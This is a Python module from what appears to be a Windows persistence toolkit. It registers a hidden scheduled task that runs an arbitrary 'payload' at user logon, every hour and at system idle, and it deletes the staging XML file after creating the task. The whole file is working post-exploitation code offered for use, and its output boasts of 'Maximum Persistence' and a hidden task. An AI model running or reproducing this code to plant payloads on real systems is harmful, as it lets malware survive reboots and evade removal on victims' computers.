"""
Multi-trigger scheduled tasks for maximum persistence
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import (
    run_command,
    validate_payload_path,
    get_current_username,
    clean_temp_file
)
from templates.xml_templates import TaskXMLTemplates
from config import DEFAULT_STAGING_DIR


class MultiTrigger:
    """Handles tasks with multiple triggers"""
    
    def __init__(self):
        self.xml_templates = TaskXMLTemplates()
    
    def create(self, task_name, payload_path):
        """
        Create task with multiple triggers for redundancy
        Combines: logon, hourly interval, and idle
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating multi-trigger scheduled task...")
        print(f"[*] Triggers: Logon + Hourly + Idle")
        
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        user = get_current_username()
        task_xml = self.xml_templates.multi_trigger(user, payload_path)
        
        xml_file = os.path.join(DEFAULT_STAGING_DIR, f"{task_name}.xml")
        
        try:
            with open(xml_file, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            command = f'schtasks /Create /TN "{task_name}" /XML "{xml_file}" /F'
            result = run_command(command)
            
            clean_temp_file(xml_file)
            
            if result['success']:
                print(f"[+] Multi-trigger task created successfully!")
                print(f"    Task Name: {task_name}")
                print(f"    Triggers:")
                print(f"      - User logon")
                print(f"      - Every hour")
                print(f"      - System idle (10 minutes)")
                print(f"    Payload: {payload_path}")
                print(f"    Hidden: Yes")
                print(f"    Maximum Persistence: Yes")
                
                return {
                    'method': 'multi_trigger',
                    'task_name': task_name,
                    'trigger': 'multiple',
                    'triggers': ['logon', 'hourly', 'idle'],
                    'payload': payload_path,
                    'requires_admin': False,
                    'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
                }
            else:
                print(f"[-] Failed to create task")
                return None
        
        except Exception as e:
            print(f"[-] Error: {e}")
            clean_temp_file(xml_file)
            return None
    
    def create_custom(self, task_name, payload_path, triggers):
        """
        Create task with custom combination of triggers
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            triggers (list): List of trigger types
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating custom multi-trigger task...")
        print(f"[*] Triggers: {', '.join(triggers)}")
        
        # This would require building custom XML
        # For now, use the standard multi-trigger
        return self.create(task_name, payload_path)